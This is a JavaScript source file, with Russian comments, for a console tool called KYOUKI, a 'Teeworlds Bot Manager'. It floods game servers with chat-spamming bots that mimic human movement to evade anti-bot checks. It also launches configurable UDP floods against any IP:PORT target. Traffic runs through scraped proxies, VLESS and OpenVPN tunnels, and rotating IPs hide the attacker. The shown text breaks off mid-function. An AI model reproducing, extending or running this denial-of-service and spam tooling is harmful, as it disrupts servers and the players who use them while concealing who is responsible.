// KYOUKI CLI — консольный интерфейс. Навигация цифрами как в меню,
// старый функционал подвязан напрямую к модулям bot.js / lib/*.
const readline = require('readline');
const fs = require('fs');
const path = require('path');
const { createBot, disconnectAllBots, setProxies, setTunnels, setTunnelFailureHandler } = require('./bot');
const PU = require('./lib/proxy-utils');
const health = require('./lib/proxy-health');
const { testUdpRelay } = require('./lib/udp-check');
const TU = require('./lib/text-utils');
const { OvpnPool } = require('./lib/ovpn-pool');

// Глобальные guard'ы: без них любое необработанное исключение
// (сдохший сокет, DNS, прокси) молча убивает весь процесс.
// Пишем в консоль + файл, работу продолжаем.
function crashLog(kind, err) {
    const line = `[${new Date().toISOString()}] ${kind}: ${(err && err.stack) || err}\n`;
    try {
        require('fs').appendFileSync(
            require('path').join(require('./lib/app-paths').baseDir(), 'kyouki-crash.log'),
            line
        );
    } catch (e) {}
    try {
        console.log(`\x1b[31m[CRASH-GUARD] ${kind}: ${(err && err.message) || err}\x1b[0m (подробности в kyouki-crash.log, работа продолжается)`);
    } catch (e) {}
}
process.on('uncaughtException', (err) => crashLog('uncaughtException', err));
process.on('unhandledRejection', (err) => crashLog('unhandledRejection', err));

// Цвета для консоли
const colors = {
    reset: '\x1b[0m',
    bright: '\x1b[1m',
    dim: '\x1b[2m',
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m',
    white: '\x1b[37m'
};

// Конфигурация по умолчанию
let config = {
    serverAddress: '',
    botNickname: '', // пусто = случайный ник каждому боту
    botCount: 10,
    botsPerProxy: 4,
    botDelay: 75,
    cycleDelay: 75,
    botMessage: 'kyouki flood',
    enableMessage: true,
    proxyList: [],
    turboMode: false,
    floodMode: 'spam', // 'spam' = зашёл-сказал-вышел циклами; 'stay' = сидят и шлют каждые N сек
    sayIntervalSec: 30, // рассылка: пауза между сообщениями
    floodTarget: '', // цель UDP Flood (IP:PORT)
    floodPps: 300, // пакетов/сек на воркер
    floodWorkers: 10, // воркеров флуда
    floodType: 'mixed', // mixed | connless | token | input
    floodUseProxies: true, // гнать флуд через прокси из списка
    verbose: false, // тихий лог: только ошибки и итоги волн
    randomMove: false, // хаотичные движения ботов
    engine: 'singbox',
    vlessSubUrl: '',
    ovpnDir: '', // папка/файл с .ovpn конфигами
    ovpnUsername: '', // логин для auth-user-pass (пусто = без кредов)
    ovpnPassword: '',
    ovpnForBots: false, // гонять ботов через активный OVPN-туннель
    floodUseOvpn: false, // гонять UDP-флуд через OVPN-туннель
    ovpnBind: true, // true = bind сокета к tunIP (быстро), false = через локальный SOCKS5
    ovpnRotateSec: 0, // ротация туннеля флуда, сек (0 = выкл)
    ovpnRotateWaves: 0 // ротация туннеля ботов каждые N волн (0 = выкл)
};

const CONFIG_FILE = path.join(require('./lib/app-paths').baseDir(), 'kyouki.config.json');
let myBots = [];
let mode = 'main'; // main | bots | proxies | xray
let running = true;

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: `${colors.magenta}kyouki>${colors.reset} `
});

// Ctrl+X — экстренное отключение всех ботов без Enter.
// Работает в любой момент: посреди запуска волны, спама, ожидания.
if (process.stdin.isTTY) {
    try {
        readline.emitKeypressEvents(process.stdin);
        process.stdin.setRawMode(true);
        process.stdin.on('keypress', (str, key) => {
            if (key && key.ctrl && key.name === 'x') {
                console.log('');
                log('Ctrl+X: экстренное отключение!', 'warning');
                (async () => {
                    try { await stopBots(); } catch (e) {}
                    try { await stopFlood(); } catch (e) {}
                })().finally(() => {
                    try { setPrompt(); } catch (e) {}
                });
            }
        });
    } catch (e) {}
}

// Очередь строк для ask() поверх 'line'
let lineQueue = [];
let lineResolvers = [];
rl.on('line', (l) => {
    const r = lineResolvers.shift();
    if (r) r(l);
    else lineQueue.push(l);
});
function readLine() {
    return new Promise((res) => {
        if (lineQueue.length) res(lineQueue.shift());
        else lineResolvers.push(res);
    });
}
function ask(q) {
    process.stdout.write(q);
    return readLine().then((s) => (s || '').trim());
}
function setPrompt() {
    const p = mode === 'main' ? 'kyouki' : `kyouki/${mode}`;
    rl.setPrompt(`${colors.magenta}${p}>${colors.reset} `);
    rl.prompt();
}
const delay = (ms) => new Promise((r) => setTimeout(r, ms));

// ---------- конфиг (автосейв, команд save/load нет) ----------
function loadConfig() {
    try {
        if (fs.existsSync(CONFIG_FILE)) {
            const data = fs.readFileSync(CONFIG_FILE, 'utf8');
            config = { ...config, ...JSON.parse(data) };
        }
    } catch (e) {
        log('Ошибка загрузки конфигурации: ' + e.message, 'error');
    }
}
function saveConfigSilent() {
    try {
        fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2));
    } catch (e) {}
}

// ---------- лог ----------
function log(message, type = 'info') {
    const timestamp = new Date().toLocaleTimeString('ru-RU');
    let color = colors.white;
    let prefix = 'INFO';
    switch (type) {
        case 'success': color = colors.green; prefix = 'OK'; break;
        case 'error': color = colors.red; prefix = 'ERR'; break;
        case 'warning': color = colors.yellow; prefix = 'WARN'; break;
        case 'info': color = colors.cyan; prefix = 'INFO'; break;
    }
    console.log(`${colors.dim}[${timestamp}]${colors.reset} ${color}${prefix}${colors.reset} ${message}`);
}

// ---------- баннер и меню (как в ex.py) ----------
function clearScreen() {
    console.clear();
}
async function pauseAndRedraw() {
    await ask(`\n${colors.dim}Enter — назад в меню${colors.reset}`);
    if (mode === 'bots') { clearScreen(); printBotsMenu(); }
    else if (mode === 'proxies') { clearScreen(); printProxiesMenu(); }
    else if (mode === 'xray') { clearScreen(); printXrayMenu(); }
    else if (mode === 'flood') { clearScreen(); printFloodMenu(); }
    else if (mode === 'main') { clearScreen(); printMainMenu(); }
}
function printBanner() {
    console.log(`
${colors.cyan}
██╗  ██╗██╗   ██╗ ██████╗ ██╗   ██╗██╗  ██╗██╗
██║ ██╔╝╚██╗ ██╔╝██╔═══██╗██║   ██║██║ ██╔╝██║
█████╔╝  ╚████╔╝ ██║   ██║██║   ██║█████╔╝ ██║
██╔═██╗   ╚██╔╝  ██║   ██║██║   ██║██╔═██╗ ██║
██║  ██╗   ██║   ╚██████╔╝╚██████╔╝██║  ██╗██║
╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝
${colors.reset}
${colors.dim}Teeworlds Bot Manager v1.0${colors.reset}
`);
}
function printMainMenu() {
    clearScreen();
    printBanner();
    console.log(`${colors.green}╔═══════════════════════════════════════════╗`);
    console.log(`║           MAIN MENU                       ║`);
    console.log(`╚═══════════════════════════════════════════╝${colors.reset}\n`);
    console.log(`  ${colors.yellow}[1]${colors.reset} Bots          - Управление ботами`);
    console.log(`  ${colors.yellow}[2]${colors.reset} Proxies       - Настройка прокси`);
    console.log(`  ${colors.yellow}[3]${colors.reset} Xray / OVPN  - Движки: sing-box, xray, OpenVPN`);
    console.log(`  ${colors.yellow}[4]${colors.reset} Stats         - Статистика`);
    console.log(`  ${colors.yellow}[5]${colors.reset} Flood         - UDP флуд`);
    console.log(`  ${colors.yellow}[0]${colors.reset} Exit          - Выход\n`);
    console.log(`  ${colors.dim}Ctrl+X — экстренно остановить всё (боты + флуд)${colors.reset}\n`);
}
function printBotsMenu() {
    clearScreen();
    console.log(`\n${colors.blue}[BOTS MENU]${colors.reset}\n`);
    console.log(`  ${colors.yellow}[1]${colors.reset} Запустить ботов`);
    console.log(`  ${colors.yellow}[2]${colors.reset} Остановить ботов`);
    console.log(`  ${colors.yellow}[3]${colors.reset} Статус ботов`);
    console.log(`  ${colors.yellow}[4]${colors.reset} Сервер (сейчас: ${config.serverAddress || 'не задан'})`);
    console.log(`  ${colors.yellow}[5]${colors.reset} Ник (сейчас: ${config.botNickname || 'рандом'})`);
    console.log(`  ${colors.yellow}[6]${colors.reset} Сообщение (сейчас: ${config.turboMode ? 'TURBO' : (config.botMessage || 'выкл')})`);
    console.log(`  ${colors.yellow}[7]${colors.reset} Количество ботов всего (сейчас: ${config.botCount})`);
    console.log(`  ${colors.yellow}[8]${colors.reset} Ботов на прокси (сейчас: ${config.botsPerProxy})`);
    console.log(`  ${colors.yellow}[9]${colors.reset} Задержка мс (сейчас: ${config.botDelay})`);
    console.log(`  ${colors.yellow}[v]${colors.reset} Лог: ${config.verbose ? 'подробный' : 'тихий'}`);
    console.log(`  ${colors.yellow}[m]${colors.reset} Движения: ${config.randomMove ? 'хаос ВКЛ' : 'выкл'}`);
    console.log(`  ${colors.yellow}[r]${colors.reset} Режим: ${config.floodMode === 'stay' ? `рассылка (каждые ${config.sayIntervalSec}с)` : 'спам (зашёл-сказал-вышел)'}`);
    console.log(`  ${colors.yellow}[o]${colors.reset} OVPN для ботов: ${config.ovpnForBots ? `ВКЛ${ovpnPool ? ` (туннелей: ${ovpnPool.aliveCount()})` : ' (пул не поднят)'}` : 'выкл'}`);
    console.log(`  ${colors.yellow}[w]${colors.reset} Ротация OVPN: ${config.ovpnRotateWaves > 0 ? `каждые ${config.ovpnRotateWaves} волн` : 'выкл'}`);
    console.log(`  ${colors.yellow}[0]${colors.reset} Назад\n`);
}
function printProxiesMenu() {
    clearScreen();
    console.log(`\n${colors.blue}[PROXIES MENU]${colors.reset} (в списке: ${config.proxyList.length})\n`);
    console.log(`  ${colors.yellow}[1]${colors.reset} Загрузить из файла`);
    console.log(`  ${colors.yellow}[2]${colors.reset} Собрать бесплатные SOCKS4/5`);
    console.log(`  ${colors.yellow}[3]${colors.reset} Проверить UDP (associate + DNS)`);
    console.log(`  ${colors.yellow}[4]${colors.reset} Показать список`);
    console.log(`  ${colors.yellow}[5]${colors.reset} Очистить список`);
    console.log(`  ${colors.yellow}[0]${colors.reset} Назад\n`);
}
function printXrayMenu() {
    clearScreen();
    let engine;
    try { engine = require('./lib/proxy-engine'); } catch (e) {}
    const st = engine && engine.isRunning() ? 'работает' : 'остановлен';
    console.log(`\n${colors.blue}[ENGINES MENU]${colors.reset} (движок: ${config.engine}, статус: ${st})\n`);
    console.log(`  ${colors.yellow}[1]${colors.reset} Импорт подписки и запуск (VLESS → sing-box/xray)`);
    console.log(`  ${colors.yellow}[2]${colors.reset} Найти бесплатные VLESS-подписки`);
    console.log(`  ${colors.yellow}[3]${colors.reset} Остановить движок`);
    console.log(`  ${colors.yellow}[4]${colors.reset} Сменить движок (сейчас: ${config.engine})`);
    console.log(`  ${colors.yellow}[5]${colors.reset} Импорт .ovpn и запуск OpenVPN`);
    console.log(`  ${colors.yellow}[6]${colors.reset} Папка/файл .ovpn (сейчас: ${config.ovpnDir || 'не задан'})`);
    console.log(`  ${colors.yellow}[7]${colors.reset} Логин/пароль OVPN (сейчас: ${config.ovpnUsername || 'без кредов'})`);
    console.log(`  ${colors.yellow}[8]${colors.reset} Поднять/перезапустить туннели пула`);
    console.log(`  ${colors.yellow}[9]${colors.reset} Статус туннелей${ovpnPool ? ` (${ovpnPool.aliveCount()} живых)` : ''}`);
    console.log(`  ${colors.yellow}[0]${colors.reset} Назад\n`);
}

// ---------- UDP Flood (старый lib/udp-flooder.js, починенный associate) ----------
let flooder = null;
let floodActive = false;
let floodRotateTimer = null;

async function startFlood() {
    if (floodActive) {
        log('Флуд уже идёт (стоп — Flood→2 / Ctrl+X)', 'warning');
        return;
    }
    const t = (config.floodTarget || '').trim();
    if (!t) {
        log('Не задана цель флуда (Flood → 4)', 'error');
        return;
    }
    const m = t.match(/^(.*?):(\d{1,5})$/);
    if (!m) {
        log('Нужен формат IP:PORT', 'error');
        return;
    }
    let host = m[1].trim();
    const port = parseInt(m[2]);
    if (port < 1 || port > 65535) {
        log('Порт 1-65535', 'error');
        return;
    }
    // SOCKS-обёртка умеет только IPv4 — хостнейм резолвим заранее
    if (!/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(host)) {
        try {
            host = (await require('dns').promises.lookup(host, 4)).address;
            log(`Резолв цели: ${host}`, 'info');
        } catch (e) {
            log(`Хост не резолвится: ${host}`, 'error');
            return;
        }
    }
    let proxies = [];
    if (config.floodUseProxies && config.proxyList.length) {
        proxies = PU.parseProxies(config.proxyList, () => {});
        if (!proxies.length) log('Прокси не распарсились — иду напрямую', 'warning');
    }

    // OVPN: активный туннель = владелец маршрута до цели.
    let tunnels = [];
    if (config.floodUseOvpn) {
        try {
            const pool = await ensureOvpnPool([host]);
            tunnels = pool.floodTunnels();
            if (!tunnels.length) log('OVPN: активного туннеля нет, флуд пойдёт без него', 'warning');
            else log(`OVPN: егресс ${tunnels[0].tunIP || tunnels[0].label} (${config.ovpnBind ? 'bind в tunIP' : 'через SOCKS5'})`, 'info');
        } catch (e) {
            log(`OVPN не поднялся: ${e.message}`, 'error');
            if (!proxies.length) return;
            log('Продолжаю на SOCKS-прокси/напрямую', 'warning');
        }
    }

    const pps = Math.min(10000, Math.max(1, parseInt(config.floodPps) || 100));
    const workers = Math.min(100, Math.max(1, parseInt(config.floodWorkers) || 5));
    const { UdpFlooder } = require('./lib/udp-flooder');
    flooder = new UdpFlooder(host, port, {
        packetsPerSecond: pps,
        workers,
        proxies,
        tunnels,
        tunnelMode: config.ovpnBind ? 'bind' : 'socks',
        packetType: config.floodType || 'mixed',
    });
    floodActive = true;
    const up = await flooder.start();
    if (up > 0) {
        const via = [
            tunnels.length ? `OVPN ${tunnels[0].tunIP || tunnels[0].label}` : null,
            proxies.length ? `прокси: ${proxies.length}` : null,
        ].filter(Boolean).join(', ') || 'напрямую';
        log(`UDP Flood в фоне: ${host}:${port}, воркеров ${up}/${workers}, ~${pps} pps/воркер, ${via} (стоп — Flood→2 / Ctrl+X)`, 'success');
        if (tunnels.length) startFloodRotation();
    } else {
        try { flooder.stop(); } catch (e) {}
        flooder = null;
        floodActive = false;
        log('Ни один воркер не поднялся (все associate/bind упали) — проверь прокси/туннели', 'error');
    }
}

async function stopFlood(silent) {
    stopFloodRotation();
    if (!floodActive || !flooder) {
        if (!silent) log('Флуд не запущен', 'warning');
        return;
    }
    let s = null;
    try { s = flooder.getStats(); } catch (e) {}
    try { flooder.stop(); } catch (e) {}
    flooder = null;
    floodActive = false;
    if (!silent) {
        log(s ? `Флуд остановлен: отправлено ${s.sent}, ответов ${s.replies || 0}, токенов ${s.tokens || 0}, ошибок ${s.errors}, средний PPS ${s.pps}, время ${s.elapsed}с` : 'Флуд остановлен', 'success');
    }
}

function floodStatus() {
    if (!floodActive || !flooder) {
        log('Флуд не запущен', 'warning');
        return;
    }
    let s = null;
    try { s = flooder.getStats(); } catch (e) {}
    if (!s) { log('Нет статистики', 'warning'); return; }
    log(`Флуд: отправлено ${s.sent}, ответов ${s.replies || 0}, токенов ${s.tokens || 0}, ошибок ${s.errors}, PPS ${s.pps}, воркеры ${s.workers}, время ${s.elapsed}с`, 'info');
    if (s.tunnels) log(`OVPN: туннелей ${s.tunnels}, режим ${s.tunnelMode || 'auto'}`, 'info');
    const lanes = Object.entries(s.lanes || {});
    if (lanes.length) {
        for (const [label, v] of lanes.slice(0, 12)) {
            log(`  ${label} [${v.mode || '?'}]: отправлено ${v.sent}, ошибок ${v.errors}`, 'info');
        }
        if (lanes.length > 12) log(`  ... и ещё ${lanes.length - 12} полос`, 'info');
    }
}

function printFloodMenu() {
    clearScreen();
    const st = floodActive ? 'ИДЁТ' : 'стоп';
    const ovpnSt = config.floodUseOvpn
        ? `ВКЛ${ovpnPool ? ` (туннелей: ${ovpnPool.aliveCount()})` : ' (пул не поднят)'}`
        : 'выкл';
    console.log(`\n${colors.blue}[FLOOD MENU]${colors.reset} UDP флуд (статус: ${st})\n`);
    console.log(`  ${colors.yellow}[1]${colors.reset} Старт`);
    console.log(`  ${colors.yellow}[2]${colors.reset} Стоп`);
    console.log(`  ${colors.yellow}[3]${colors.reset} Статус`);
    console.log(`  ${colors.yellow}[4]${colors.reset} Цель (сейчас: ${config.floodTarget || 'не задана'})`);
    console.log(`  ${colors.yellow}[5]${colors.reset} PPS на воркер (сейчас: ${config.floodPps})`);
    console.log(`  ${colors.yellow}[6]${colors.reset} Воркеры (сейчас: ${config.floodWorkers})`);
    console.log(`  ${colors.yellow}[7]${colors.reset} Тип пакетов (сейчас: ${config.floodType})`);
    console.log(`  ${colors.yellow}[8]${colors.reset} Прокси из списка: ${config.floodUseProxies ? 'ВКЛ' : 'выкл'}`);
    console.log(`  ${colors.yellow}[9]${colors.reset} OVPN-туннель: ${ovpnSt}`);
    console.log(`  ${colors.yellow}[b]${colors.reset} OVPN-режим: ${config.ovpnBind ? 'bind в tunIP (быстро)' : 'через локальный SOCKS5'}`);
    console.log(`  ${colors.yellow}[r]${colors.reset} Ротация туннеля: ${config.ovpnRotateSec > 0 ? `каждые ${config.ovpnRotateSec}с` : 'выкл'}`);
    console.log(`  ${colors.yellow}[0]${colors.reset} Назад\n`);
}

async function handleFloodMenu(input) {
    switch (input) {
        case '1': await startFlood(); break;
        case '2': await stopFlood(); break;
        case '3': floodStatus(); break;
        case '4': {
            const v = await ask('Цель флуда (IP:PORT): ');
            if (v) {
                config.floodTarget = v;
                saveConfigSilent();
                log(`Цель: ${v}`, 'success');
            }
            break;
        }
        case '5': {
            const v = Math.min(10000, Math.max(1, parseInt(await ask('PPS на воркер (1-10000): ')) || config.floodPps));
            config.floodPps = v;
            saveConfigSilent();
            log(`PPS: ${v} (применится при следующем старте)`, 'success');
            break;
        }
        case '6': {
            const v = Math.min(100, Math.max(1, parseInt(await ask('Воркеры (1-100): ')) || config.floodWorkers));
            config.floodWorkers = v;
            saveConfigSilent();
            log(`Воркеры: ${v} (применится при следующем старте)`, 'success');
            break;
        }
        case '7': {
            const order = ['mixed', 'connless', 'token', 'input'];
            const next = order[(order.indexOf(config.floodType) + 1) % order.length];
            config.floodType = next;
            saveConfigSilent();
            log(`Тип пакетов: ${next}`, 'success');
            break;
        }
        case '8':
            config.floodUseProxies = !config.floodUseProxies;
            saveConfigSilent();
            log(`Флуд через прокси: ${config.floodUseProxies ? 'ВКЛ (берутся из списка)' : 'выкл (напрямую)'}`, 'success');
            break;
        case '9':
            config.floodUseOvpn = !config.floodUseOvpn;
            saveConfigSilent();
            log(`Флуд через OVPN: ${config.floodUseOvpn ? 'ВКЛ (активный туннель пула)' : 'выкл'}`, 'success');
            break;
        case 'b': case 'B':
            config.ovpnBind = !config.ovpnBind;
            saveConfigSilent();
            log(`OVPN-режим: ${config.ovpnBind ? 'bind сокета к tunIP (без SOCKS-релея)' : 'через локальный SOCKS5 туннеля'}`, 'success');
            break;
        case 'r': case 'R': {
            const v = parseInt(await ask('Ротация туннеля, секунд (0 = выкл, минимум 10): '));
            config.ovpnRotateSec = !v || v <= 0 ? 0 : Math.max(10, v);
            saveConfigSilent();
            log(config.ovpnRotateSec ? `Ротация: каждые ${config.ovpnRotateSec}с` : 'Ротация: выкл', 'success');
            break;
        }
        case '0': mode = 'main'; printMainMenu(); return;
        default: log('Нет такого пункта (0 — назад)', 'error');
    }
    await pauseAndRedraw();
}

// ---------- боты (старый функционал: bot.js createBot + game.Say) ----------
function parseServerOrWarn() {
    const v = PU.validateServerAddress(config.serverAddress);
    if (!v || v.ok === false) {
        log('Не задан или неверный адрес сервера (формат IP:PORT)', 'error');
        return null;
    }
    const [ip, port] = PU.parseServer(config.serverAddress);
    if (!ip || !port) {
        log('Неверный адрес сервера (формат IP:PORT)', 'error');
        return null;
    }
    return { ip, port };
}

// Хаотичные движения: каждые 200-600мс случайное направление/прыжок/хук/прицел.
// Сервер видит живого игрока, а не статую (анти-АФК и антибот это любят меньше).
function startRandomMove(bot) {
    const tick = () => {
        try {
            const mv = bot.movement;
            if (!mv) return;
            const r = Math.random();
            if (r < 0.35) mv.RunLeft();
            else if (r < 0.7) mv.RunRight();
            else mv.RunStop();
            mv.Jump(Math.random() < 0.3);
            mv.Hook(Math.random() < 0.15);
            mv.SetAim(
                Math.floor(Math.random() * 600) - 300,
                Math.floor(Math.random() * 400) - 200
            );
            if (Math.random() < 0.1) mv.Fire();
            try { bot.sendInput(); } catch (e) {}
        } catch (e) {}
    };
    tick();
    const timer = setInterval(tick, 200 + Math.floor(Math.random() * 400));
    moveTimers.add(timer);
    try { bot.__moveTimer = timer; } catch (e) {}
    return () => {
        try { clearInterval(timer); } catch (e) {}
        moveTimers.delete(timer);
        try { if (bot.__moveTimer === timer) bot.__moveTimer = null; } catch (e) {}
    };
}
const moveTimers = new Set();
const sayTimers = new Set();
// Чистит все интервалы бота (движения + рассылка): вызывать при любом disconnect,
// иначе тиканье мёртвого бота живёт вечно.
function clearBotTimers(bot) {
    try {
        if (bot.__moveTimer) { clearInterval(bot.__moveTimer); moveTimers.delete(bot.__moveTimer); bot.__moveTimer = null; }
        if (bot.__sayTimer) { clearInterval(bot.__sayTimer); sayTimers.delete(bot.__sayTimer); bot.__sayTimer = null; }
    } catch (e) {}
}

// Отправка чата с подтверждением эхом (как sayWithEcho в renderer.js):
// шлём CL_SAY и ждём, пока сервер вернёт наше же сообщение обратно (до 3 попыток).
// Перед каждой попыткой шлём инпут: молчащий клиент без инпутов сервер игнорит чаще.
function sayWithEcho(bot, text) {
    return new Promise((resolve) => {
        let done = false;
        let timer = null;
        const onMsg = (msg) => {
            try {
                if (msg && msg.message === text && !done) {
                    done = true;
                    try { bot.removeListener('message', onMsg); } catch (e) {}
                    if (timer) clearTimeout(timer);
                    resolve(true);
                }
            } catch (e) {}
        };
        const finish = (ok) => {
            if (done) return;
            done = true;
            try { bot.removeListener('message', onMsg); } catch (e) {}
            if (timer) clearTimeout(timer);
            resolve(ok);
        };
        try { bot.on('message', onMsg); } catch (e) { finish(false); return; }
        let n = 0;
        const attempt = () => {
            if (done || !floodRunning) { finish(false); return; }
            if (n >= 3) { finish(false); return; }
            n++;
            try {
                try { if (bot.sendInput) bot.sendInput(); } catch (e) {}
                bot.game.Say(text);
            }
            catch (e) { finish(false); return; }
            timer = setTimeout(attempt, 2000);
        };
        attempt();
    });
}

function untrack(bot) {
    const ix = myBots.indexOf(bot);
    if (ix >= 0) myBots.splice(ix, 1);
}

// Локальные endpoint'ы движка (127.0.0.1) умирают при рестарте движка,
// а в списке остаются старые порты -> ECONNREFUSED у каждого бота.
// Быстрый префлайт: TCP-проба локальных, мёртвые молча выкидываем.
const LOCAL_PROXY_HOSTS = ['127.0.0.1', '::1', 'localhost'];
function isLocalProxyIp(ip) {
    return LOCAL_PROXY_HOSTS.includes(String(ip || '').trim().toLowerCase());
}
function localProxyAlive(ip, port, timeoutMs) {
    return new Promise((resolve) => {
        const s = require('net').connect({ host: ip, port: Number(port) });
        s.setTimeout(timeoutMs || 800);
        s.on('connect', () => { try { s.destroy(); } catch (e) {} resolve(true); });
        s.on('timeout', () => { try { s.destroy(); } catch (e) {} resolve(false); });
        s.on('error', () => resolve(false));
    });
}
async function dropDeadLocalProxies(list) {
    const locals = list.filter((p) => isLocalProxyIp(p.ip));
    if (!locals.length) return list;
    const checks = await Promise.all(locals.map(async (p) => ({
        p, alive: await localProxyAlive(p.ip, p.port, 800)
    })));
    const dead = checks.filter((c) => !c.alive).length;
    if (dead > 0) {
        log(`Мёртвых локальных endpoint'ов: ${dead} (движок перезапущен? сделай Xray→1 заново)`, 'warning');
    }
    const deadKeys = new Set(checks.filter((c) => !c.alive).map((c) => `${c.p.ip}:${c.p.port}`));
    return list.filter((p) => !deadKeys.has(`${p.ip}:${p.port}`));
}

// Лог движка (sing-box/xray сыпет INFO на каждый UDP-пакет):
// в тихом режиме показываем только warn/error, остальное молча топим.
function engineLog(m) {
    const s = String(m || '');
    if (!s) return;
    if (config.verbose) { log(s.slice(0, 200), 'info'); return; }
    if (/warn|error|fail|denied|timeout/i.test(s)) {
        log(s.slice(0, 200), /error|fail|denied/i.test(s) ? 'error' : 'warning');
    }
}

// ---------- OVPN пул: одни и те же туннели для ботов и флуда ----------
let ovpnPool = null;

function getOvpnPool() {
    if (!ovpnPool) {
        ovpnPool = new OvpnPool({
            username: config.ovpnUsername || null,
            password: config.ovpnPassword || null,
            log: (m) => engineLog(m),
            onActiveLost: () => {
                log('OVPN: активный туннель потерян, нужен перезапуск (Движки → [8])', 'warning');
            }
        });
        // Смерть туннеля во время волны ботов: сразу пытаемся поднять заново,
        // не дожидаясь health-таймера. Следующая волна возьмёт новый активный.
        setTunnelFailureHandler((proxy, reason) => {
            log(`OVPN: туннель ${proxy.via || proxy.id || proxy.tunIP} отвалился (${String(reason).slice(0, 80)})`, 'warning');
            if (ovpnPool) ovpnPool.healthNow().catch(() => {});
        });
    }
    return ovpnPool;
}

// Поднимает пул из config.ovpnDir, если ещё не поднят; обновляет /32-маршруты
// до целей (флуд/сервер ботов), чтобы трафик шёл именно в туннель.
async function ensureOvpnPool(routeTargets) {
    const src = (config.ovpnDir || '').trim();
    if (!src) throw new Error('не задан путь к .ovpn (Движки → [6])');
    const pool = getOvpnPool();
    pool.username = config.ovpnUsername || null;
    pool.password = config.ovpnPassword || null;
    const prevSpec = pool.spec;
    const files = await pool.load(src);
    if (!files.length) throw new Error(`в «${src}» нет .ovpn`);

    // Сменили набор конфигов на лету — старые туннели больше не нужны.
    if (pool.active && prevSpec !== src) {
        log(`OVPN: набор конфигов сменился (${prevSpec || '—'} -> ${src}), перезапуск пула`, 'info');
        await pool.close();
    }

    if (!pool.active) {
        const active = await pool.start({ routeTargets: routeTargets || [] });
        log(`OVPN: туннелей ${pool.aliveCount()}/${files.length}, активный ${active ? (active.via || active.label) : '—'}`, 'success');
    } else if (routeTargets && routeTargets.length) {
        await pool.setRouteTargets(routeTargets);
    }
    return pool;
}

function stopFloodRotation() {
    if (floodRotateTimer) {
        try { clearInterval(floodRotateTimer); } catch (e) {}
        floodRotateTimer = null;
    }
}

// Ротация внешнего IP флуда: переключаем активный туннель и перезапускаем
// воркеров на новом tunIP (старые сокеты привязаны к прежнему интерфейсу).
function startFloodRotation() {
    stopFloodRotation();
    const sec = Math.max(10, parseInt(config.ovpnRotateSec) || 0);
    if (!sec || !ovpnPool) return;
    if (ovpnPool.aliveCount() < 2) {
        log('OVPN: для ротации нужно минимум 2 живых туннеля', 'warning');
        return;
    }
    floodRotateTimer = setInterval(async () => {
        if (!floodActive || !flooder || !ovpnPool) return;
        try {
            const t = await ovpnPool.next();
            if (!t) return;
            await flooder.setActiveTunnel(ovpnPool.toFloodTunnel(t));
            log(`OVPN: флуд переключён на ${t.via || t.label}`, 'info');
        } catch (e) {
            log(`OVPN ротация: ${e.message}`, 'warning');
        }
    }, sec * 1000);
    if (floodRotateTimer.unref) floodRotateTimer.unref();
}

// Флаг цикла флуда. start уходит в фон — промпт свободен,
// stop работает в любой момент (экстренное отключение).
let floodRunning = false;

async function startBots() {
    if (floodRunning) {
        log('Флуд уже запущен (stop — остановить)', 'warning');
        return;
    }
    const srv = parseServerOrWarn();
    if (!srv) return;
    const { ip, port } = srv;

    let alive = health.pickAlive(PU.parseProxies(config.proxyList, () => {}));
    // OVPN-режим ботов: все боты идут через АКТИВНЫЙ туннель (владелец
    // /32-маршрута до сервера). SOCKS-список при этом не мешаем — иначе
    // часть ботов выйдет с домашнего IP и смысл туннеля теряется.
    let tunnelProxy = null;
    if (config.ovpnForBots) {
        try {
            const pool = await ensureOvpnPool([ip]);
            const active = pool.active;
            if (active) {
                tunnelProxy = active;
                alive = [active];
                log(`OVPN: боты через ${active.via || active.label} (${active.tunIP || 'system route'})`, 'info');
            } else {
                log('OVPN: активного туннеля нет — боты пойдут по прокси/напрямую', 'warning');
            }
        } catch (e) {
            log(`OVPN не поднялся: ${e.message} — боты пойдут по прокси/напрямую`, 'error');
        }
    }
    const useProxies = alive.length > 0;
    if (config.proxyList.length > 0 && !useProxies) {
        log('Все прокси исключены health-модулем — пробую все равно все', 'warning');
        for (const p of PU.parseProxies(config.proxyList, () => {})) alive.push(p);
    }
    // Префлайт локальных endpoint'ов: отрезаем протухшие порты до волны
    alive = await dropDeadLocalProxies(alive);
    if (useProxies && !alive.length) {
        log('Все прокси мертвы (локальные не отвечают) — волна пропущена', 'error');
        floodRunning = false;
        log('Флуд остановлен', 'info');
        return;
    }
    // OVPN включён, но туннеля нет и прокси тоже нет: не светим прямой IP.
    if (config.ovpnForBots && !tunnelProxy && !alive.length) {
        log('OVPN не поднялся, прокси нет — волна пропущена (прямой IP не светим)', 'error');
        return;
    }
    const perProxyCount = Math.min(10, Math.max(1, parseInt(config.botsPerProxy) || 4));
    // Количество = ВСЕГО ботов на волну (а не циклов): распределяются по прокси,
    // каждый прокси берёт до perProxyCount подряд, дальше по кругу при нехватке.
    const maxBots = Math.min(10000, Math.max(1, parseInt(config.botCount) || 10));
    const totalBots = maxBots;
    setProxies(alive);
    setTunnels(tunnelProxy ? [tunnelProxy] : []);

    const serverLabel = `${ip}:${port}`;
    floodRunning = true;
    log(`Флуд запущен в фоне [${config.floodMode === 'stay' ? `рассылка каждые ${config.sayIntervalSec}с` : 'спам волнами'}]: ${totalBots} ботов на ${serverLabel} (${tunnelProxy ? `OVPN ${tunnelProxy.tunIP || tunnelProxy.label}` : (useProxies ? `${alive.length} прокси, до ${perProxyCount} на прокси` : 'прямой IP')}) (stop/Ctrl+X — экстренно остановить)`, 'success');

    let cycle = 0;
    while (floodRunning) {
        cycle++;

        // Ротация OVPN между волнами: новый активный туннель -> новый внешний IP.
        // В режиме рассылки боты сидят на месте — ротация невозможна без обрыва.
        if (tunnelProxy && config.ovpnForBots && config.ovpnRotateWaves > 0 && ovpnPool &&
            config.floodMode !== 'stay' && cycle > 1 && ((cycle - 1) % config.ovpnRotateWaves) === 0) {
            try {
                const t = await ovpnPool.next();
                if (t) {
                    tunnelProxy = ovpnPool.descriptor(t);
                    alive = [tunnelProxy];
                    setProxies(alive);
                    setTunnels([tunnelProxy]);
